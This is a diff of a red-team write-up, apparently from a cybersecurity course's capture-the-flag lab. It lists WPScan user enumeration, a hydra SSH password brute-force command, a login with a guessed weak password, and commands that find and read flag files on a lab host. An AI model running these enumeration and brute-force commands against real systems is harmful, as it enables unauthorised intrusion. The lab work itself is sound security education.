@@ -48,7 +48,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - wpscan --url http://192.168.1.110 --enumerate u
        <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wpscan_michael.png?raw=true" alt="WPScan Users"/>             
 
-      - Brute force, ==guess==, or hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh  
+      - Brute force, `guess`, or hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh  
       - _TODO: Include the command run_  guess Password `michael` for user michael.    
       ssh michael@192.168.1.110  
       pwd: michael  
@@ -64,6 +64,18 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - _TODO: Identify the exploit used_
       - _TODO: Include the command run_
+     -  Same exploit covered in flag1 to gain access
+     - Commands:
+     - ssh michael@192.168.1.110
+     - pw: michael
+     - cd /var/www
+     - find / i-name flag*
+     - cat flag2.txt
+<img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/FLAG-2.png?raw=true" alt="Flag2"/>  
+
+
+
+
   - `Flag3: afc01ab56b50591e7dccf93122770cd2` _hash value_  
         - **Exploit Used**
           - _TODO: Identify the exploit used_
